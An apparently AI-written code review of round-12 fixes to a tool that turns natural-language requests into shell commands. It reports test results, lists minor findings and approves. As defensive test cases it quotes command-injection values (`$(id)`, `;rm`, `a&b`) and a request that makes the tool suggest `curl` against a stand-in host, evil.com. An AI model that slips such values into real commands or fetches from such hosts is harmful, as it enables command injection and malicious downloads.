The round-12 fixes are correct, and I found no new blocker or major. All 329 tests pass. I probed about 60 cases across the new pull-request handling, the namespace history scope and package version constraints, and compared the suspicious ones against the previous commit (`7830a12`) using a temporary worktree in `/tmp`, which I've since removed. The repo is unchanged.

**Round-12 findings: all fixed**
- **Explicit pull request kept** (`src/fill.js:25-32`, `:131-139`; `src/pipeline.js:88`, `:156`): a URL, a branch or `#45` is kept. Anything that isn't valid becomes `<PR>`, including a GitLab URL, `foo;rm`, `$(id)`, `a&b`, `~/x`, `@{u}` and a URL with `?x=1`. The pwsh and cmd output is the same, and the raw value can't contain anything the shell would interpret.
- **Namespace scope** (`src/history.js:623`, `:633`): after `nsenter` or `unshare`, "kill it" and "delete it" are refused. This holds with `/usr/bin/`, `sudo -E`, `env`, `nice`, `time`, `setsid`, `busybox` in front, and with `--target=`, `--pid --fork` and `--`. Plain `ps -p 42` followed by "kill it" still gives `kill 42`.
- **Version constraints** (`src/slots.js:467-473`, `:576-582`; `src/pipeline.js:81-84`): `==`, `!=`, `~=`, `<`, `>`, `>=,<`, extras with a version, and npm `@^`, `@latest` and `@18` are all quoted correctly in bash, zsh, fish, pwsh and cmd. In cmd, a `!` makes the suggestion fail with no command rather than produce one. `;rm` and `file:../x` give `<PKG>`.
- **`train_lm_gpu.py:53`, `:86-87`**: the trainer now trains the partial last batch, and an empty train split stops with an error. The `steps` count still matches the number of batches per epoch.

## Findings

### Minor
1. **The pull-request detection takes any word after "pr" / "pull request" as the target, which breaks common phrasings that worked before** (`src/fill.js:29-31`, used at `:134-136`). `PR_NOT_SELECTOR` only lists a few function words, so normal words pass the branch-name check and become the target. The old code gave the plain command for all of these:

   | Request | Now gives | Before |
   |---|---|---|
   | `show pr status` / `check pr status` | `gh pr checks status` | `gh pr checks` |
   | `view pull request on github` | `gh pr view github` | `gh pr view` |
   | `merge PR by bob` | `gh pr merge by` | `gh pr merge` |
   | `merge pull request quickly` | `gh pr merge quickly` | `gh pr merge` |
   | `merge pull request for me` | `gh pr merge me` | `gh pr merge` |
   | `merge pull request from bob` | `gh pr merge bob` | `gh pr merge` |

   None of these report a missing value, so they look complete. Most fail harmlessly in gh with "no pull requests found for branch …". A merge targets the wrong PR only if a branch with that word's name exists (`bob`, `main`). Suggested fix: only accept a word as a branch if it contains `/`, `-`, `_` or a digit, or follows `branch`, `for` or `from`. Otherwise fall back to the plain command or `<PR>`. Also add tests for "check pr status" and "view pull request on github".
2. **`install requests[socks] with pip` gives `<PKG>`** (`src/pipeline.js:83`): extras are only accepted together with a version. This is safe, since it shows a placeholder, but it's inconsistent with `requests[socks]==2.32.0`, which works.
3. **Only the first package is kept when several are named, with no warning** (`src/slots.js:578`). `install numpy, pandas with pip`, `install requests>=2 and flask with pip` and `install react@18 react-dom@18 with npm` each install only the first package. The previous commit behaves the same, so this isn't a regression.
4. **`install requests@https://evil.com/x.tgz with pip` is classified as a download and gives `curl -fLO https://evil.com/x.tgz`.** The previous commit does the same. It's rated medium, so it isn't run automatically.

### Carried over from earlier rounds (not regressions)
5. A whole `bash -c "…"` string becomes one file name for "delete it".
6. `cp -t /etc a` is rated `safe` (`src/danger.js:284-289`).
7. `scripts/hybrid/lm_rerank.py:203` resumes using only `(set, i)` as the key, without checking whether the model or candidates changed.
8. `show pull request feature/login` is classified as creating a pull request and gives `gh pr create --fill`. This is the classifier issue already noted in the round-12 fix log.

### Nits
9. The new pull-request check (`src/fill.js:26`) accepts names git rejects, such as `x.lock`, a trailing `/` and `HEAD`. gh just reports an error for these, so it's harmless.

VERDICT: APPROVE
